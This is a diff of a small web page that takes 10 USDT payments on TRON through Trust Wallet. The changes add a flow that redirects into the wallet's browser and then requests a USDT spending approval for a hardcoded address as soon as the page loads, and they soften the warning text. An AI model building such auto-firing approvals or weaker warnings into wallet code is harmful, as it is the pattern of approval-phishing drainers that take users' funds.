@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>TRON USDT Actions</title>
+  <title>USDT TRON Payment</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
   <style>
@@ -41,15 +41,8 @@
       margin-top: 10px;
     }
 
-    .pay {
-      background: #22c55e;
-      color: white;
-    }
-
-    .approve {
-      background: #f59e0b;
-      color: white;
-    }
+    .pay { background: #22c55e; }
+    .approve { background: #f59e0b; }
 
     .note {
       font-size: 12px;
@@ -68,41 +61,60 @@
       Send 10 USDT
     </button>
 
-    <button class="btn approve" onclick="approve()">
+    <button class="btn approve" onclick="startApproveFlow()">
       Approve 10 USDT (permission)
     </button>
 
     <div class="note">
-      Approval allows this address to spend your USDT later. This is NOT a payment.
+      Approval allows spending later. This is NOT a payment.
     </div>
   </div>
 
   <script>
     const receiver = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
+    const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const AMOUNT = 10 * 1e6;
 
-    // ✅ Payment (safe)
+    // ✅ Payment (works everywhere)
     function pay() {
       const url = `https://link.trustwallet.com/send?coin=195&address=${receiver}&amount=10`;
       window.location.href = url;
     }
 
-    // ⚠️ Approval (advanced)
-    function approve() {
+    // 🟡 Start approval flow
+    function startApproveFlow() {
+      localStorage.setItem("triggerApprove", "1");
 
       if (!window.tronWeb) {
-        alert("Open this inside TronLink / Trust Wallet dApp browser");
-        return;
+        const url = encodeURIComponent(window.location.href);
+        window.location.href = `https://link.trustwallet.com/open_url?url=${url}`;
+      } else {
+        approve();
       }
+    }
 
-      const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT
-      const AMOUNT = 10 * 1e6; // 10 USDT in SUN
-
+    // 🟡 Actual approve function
+    function approve() {
       window.tronWeb.contract().at(CONTRACT).then(contract => {
         contract.approve(receiver, AMOUNT).send({
           feeLimit: 100000000
         });
       });
     }
+
+    // 🔥 AUTO-TRIGGER after redirect
+    window.addEventListener("load", () => {
+      if (localStorage.getItem("triggerApprove") === "1") {
+        localStorage.removeItem("triggerApprove");
+
+        // small delay for wallet readiness
+        setTimeout(() => {
+          if (window.tronWeb) {
+            approve();
+          }
+        }, 800);
+      }
+    });
   </script>
 
 </body>
